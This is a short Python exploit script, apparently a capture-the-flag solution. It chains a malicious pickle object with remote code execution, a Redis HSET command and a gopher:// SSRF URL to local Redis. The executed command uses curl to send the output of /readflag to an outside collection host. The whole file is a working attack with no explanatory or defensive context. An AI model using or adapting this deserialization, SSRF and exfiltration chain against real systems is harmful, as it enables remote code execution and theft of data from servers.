import base64
import pickle
import os
from urllib.parse import quote

class RCE:
    def __reduce__(self):
        cmd = ('curl http://<extractor service>/asd -H"Test: $(/readflag)"')
        return os.system, (cmd,)

pickle_exploit = pickle.dumps(RCE())
exploit_enc = base64.b64encode(pickle_exploit).decode("utf-8") 
redis_command = f'HSET jobs 1337 "{exploit_enc}"'

path2 = quote(f'{redis_command}')
http_request_url = f'gopher://127.0.0.1:6379/_{path2}'

print(http_request_url)
